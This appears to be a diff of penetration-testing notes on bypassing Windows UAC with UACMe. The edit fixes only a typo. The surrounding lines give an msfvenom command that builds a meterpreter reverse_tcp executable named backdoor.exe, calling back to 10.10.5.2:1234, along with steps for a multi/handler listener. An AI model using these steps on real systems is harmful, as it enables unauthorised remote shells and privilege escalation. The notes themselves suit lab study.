@@ -42,7 +42,7 @@ Bypassing UAC With UACMe
 - net localgroup administrators [ this will show members of administrative group ]
 - As our current user is part of administrative group we can use UAC for privilege escalation
 - now back to meterpreter sessions
-- now we need to create msfvenom paylaods so move in tab
+- now we need to create msfvenom paylaods so move into new tab
 - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT= 1234 -f exe >backdoor.exe
 - now open msfconsole in new tab
 - use multi/handler
